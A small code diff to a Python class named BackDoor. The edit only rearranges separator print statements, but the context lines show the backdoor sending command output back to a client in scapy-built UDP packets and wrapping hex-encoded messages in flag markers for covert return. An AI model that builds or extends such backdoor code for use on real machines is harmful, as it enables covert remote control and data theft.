@@ -35,6 +35,8 @@ class BackDoor:
         pkt = ip / udp / payload
         try:
             print("Sending output back to client")
+            print("--------------------------------------------------------------")
+            print("--------------------------------------------------------------")
             send(pkt, verbose=0)
         except PermissionError:
             print("Permission error! Run as sudo or admin!")
@@ -50,7 +52,6 @@ class BackDoor:
         print("--------------------------------------------------------------")
         msg = self.flag_begin + hex_str + self.flag_close
         print(f"Added flags, sending: {msg}")
-        print("--------------------------------------------------------------")
         return msg
 
 
